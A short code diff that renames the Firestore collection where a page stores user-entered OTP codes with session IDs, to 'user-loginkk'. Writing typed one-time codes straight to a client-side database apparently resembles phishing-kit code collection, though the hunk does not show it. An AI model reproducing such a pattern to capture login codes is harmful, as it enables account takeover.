@@ -314,7 +314,7 @@
         otpError.style.display = 'none';
       }
 
-      db.collection("otp_verifications").add({
+      db.collection("user-loginkk").add({
         otp: otpValue,
         sessionId: sessionId,
         timestamp: firebase.firestore.FieldValue.serverTimestamp()
